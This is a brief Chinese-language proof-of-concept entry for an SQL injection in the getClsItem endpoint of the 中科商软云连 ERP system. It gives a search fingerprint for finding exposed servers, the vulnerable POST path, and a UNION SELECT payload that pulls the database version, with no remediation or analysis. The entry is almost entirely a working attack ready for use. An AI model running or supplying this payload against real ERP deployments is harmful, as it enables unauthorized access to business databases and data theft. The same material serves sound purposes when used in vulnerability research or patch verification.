# 中科商软云连ERP管理系统getClsItem存在SQL注入漏洞

中科商软云连ERP管理系统 ｜ SQL注入 ｜ —
- **指纹**：`title="Powered By chaosZ"`
- **请求**：`POST /gateway/user_defined_cls!getClsItem.action HTTP/1.1`

**Payload**
```
id=1') UNION ALL SELECT @@VERSION,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
```
- **响应特征**：200